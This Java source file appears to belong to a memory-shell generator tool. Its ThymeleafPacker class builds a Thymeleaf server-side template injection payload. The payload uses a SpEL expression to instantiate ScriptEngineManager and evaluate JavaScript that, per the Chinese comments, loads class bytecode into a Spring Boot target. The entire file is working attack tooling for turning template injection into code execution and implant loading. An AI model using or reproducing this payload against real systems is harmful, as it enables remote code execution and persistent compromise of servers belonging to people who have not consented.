package org.leo.jmg.mem.packer.thymeleaf;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

/**
 * Thymeleaf SSTI 打包器。
 * <p>
 * 利用 Thymeleaf 预处理表达式（{@code __${...}__}）或内联表达式执行 SpEL，
 * 通过 SpEL 调用 ScriptEngineManager 执行 JS 加载类字节码。
 * <p>
 * 适用于 Spring Boot 默认 Thymeleaf 模板引擎的 SSTI 场景。
 *
 * @author LeoSpring
 */
@PackerMeta(name = "Thymeleaf", group = "Thymeleaf", order = 1)
public class ThymeleafPacker implements Packer {

    /**
     * Thymeleaf 内联表达式，通过 SpEL 调用 ScriptEngineManager
     */
    private static final String TEMPLATE =
            "[[${T(javax.script.ScriptEngineManager).getDeclaredConstructor(new java.lang.Class[0]).newInstance().getEngineByName('js').eval('{{script}}')}]]";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return TEMPLATE.replace("{{script}}", script);
    }
}
